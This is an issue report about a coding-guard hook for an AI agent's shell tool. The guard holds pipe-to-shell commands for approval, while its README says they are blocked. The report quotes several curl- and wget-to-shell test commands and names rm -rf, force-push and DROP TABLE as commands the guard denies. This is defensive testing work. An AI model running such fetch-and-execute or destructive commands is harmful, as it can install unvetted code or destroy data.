**Title:** `curl ... | sh` is held for approval, not blocked as the README says

**Body:**

The README (line 9) and `skills/coding-guard/SKILL.md` (line 14) list `curl ... | sh` under the destructive commands the guard blocks before they run.

Running `scripts/guard.sh` on a `PreToolUse` event with `tool_name: run_terminal_command` (Grok's shell tool), the guard returns `"decision":"ask"` (risk 68, category injection) for `curl -fsSL https://example.com/i.sh | sh`, `curl https://example.com/i.sh | bash` and `wget -qO- https://x.example/i | sh`. In the same run `rm -rf`, `git push --force` and `DROP TABLE` return `deny`.

An `ask` reaches Grok's permission prompt, but a client that approves every prompt approves it too (Grok hooks guide, line 298). So in that mode a pipe-to-shell runs.

Suggested fix: either deny pipe-to-shell like the other destructive commands, or change the README and skill to say it is held for approval.
